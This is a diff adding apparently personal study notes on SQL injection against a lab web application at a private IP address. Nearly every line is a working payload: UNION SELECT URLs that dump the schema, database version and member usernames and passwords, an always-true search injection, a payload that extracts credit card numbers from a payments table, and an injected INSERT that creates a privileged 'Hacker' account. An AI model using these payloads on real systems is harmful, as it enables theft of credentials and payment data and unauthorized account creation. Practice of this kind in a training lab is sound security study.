@@ -1,0 +1,19 @@
+For GET method in command line injection, do:
+--> To view everything
+http://10.100.28.48/cases/productsCategory.php?category=1%20UNION%20SELECT%20table_schema,table_name,column_name from information_schema.columns
+---> To view database version:
+http://10.100.28.48/cases/productCategory.php?category=1 UNION SELECT databse(), @@version, 3
+--> To view all entries in the Members table from the sqlinjection database (uses GET method)
+http://10.100.28.48/cases/productsCategory.php?category=1 UNION SELECT id,username,password from sqlinjection.members
+---> To use a POST method in an input box searching for a product by name:
+(here's a normal search:): case --yields--> SELECT name, description FROM products WHERE description LIKE '%case%'
+(here's a malicious search): a%' OR '1'= '%1  --yields--> SELECT name, description FROM products WHERE description LIKE '%a%' OR '1'= '%1%'
+(that will display all names and descriptions since the second statement is always true)
+---> Use a  POST method to view all credit cards from the payments table, using a search box within the products table:
+Enter your maximum budget in the box
+(here's a normal): 555 --yields--> SELECT id, name, description, (SELECT MAX(price) FROM products WHERE price <= 555 AND categories.id = category) AS maxamount FROM categories HAVING maxamount IS NOT NULL  
+(here's a malicious): 99999999) FROM categories UNION SELECT id,creditcard_number,date,8 FROM payments;#
+--yields--> SELECT id, name, description, (SELECT MAX(price) FROM products WHERE price <= 99999999) FROM categories UNION SELECT id,creditcard_number,date,8 FROM payments;# AND categories.id = category) AS maxamount FROM categories HAVING maxamount IS NOT NULL
+
+---> To create user entries in a multifield POST method, here's the SQL command that the frontend creates on teh backend
+INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Fake1', 'last', 'fakeuser1', 'fakepass', 'fake1@email', 3), ('Hacker', 'Man', 'hman', 'hpass', 'hack@hack", 1), ('Fake2', 'last', 'fakeuser2', 'fakepass', 'fake2@email', 3)
